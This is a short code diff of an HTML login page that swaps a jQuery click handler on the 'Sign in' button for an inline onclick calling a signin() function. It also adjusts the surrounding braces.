@@ -113,7 +113,7 @@ h2 {
                                    <input  type="password" id="password" name="password" maxlength="25" class="form-control">
                               </div>
                               <div class="form-group" style="padding-top: 12px;">
-                                   <button  type="button" name="submit" id="submit" class="btn btn-block" style="background-color: #f0c14b; color:#000; font-size: 15px; border-color: #000;">Sign in</button>
+                                   <button  type="button" name="submit" onclick="signin();" class="btn btn-block" style="background-color: #f0c14b; color:#000; font-size: 15px; border-color: #000;">Sign in</button>
                               </div>
                            <div class="form-group divider">
                                    <hr class="left"><small>Sign in</small><hr class="right">
@@ -131,7 +131,7 @@ h2 {
 </html>
 <script type="text/javascript">
   var count = 0;
-  $('#submit').on('click', function() {
+   function signin() {
         var email=$('#email').val();
         var password=$('#password').val();
         if(email =="")
@@ -177,7 +177,7 @@ h2 {
         
        });   
       }
-  });
+  }
 
 
   window.csrf = { csrf_token: '<?php echo $_SESSION['csrf_token']; ?>' };
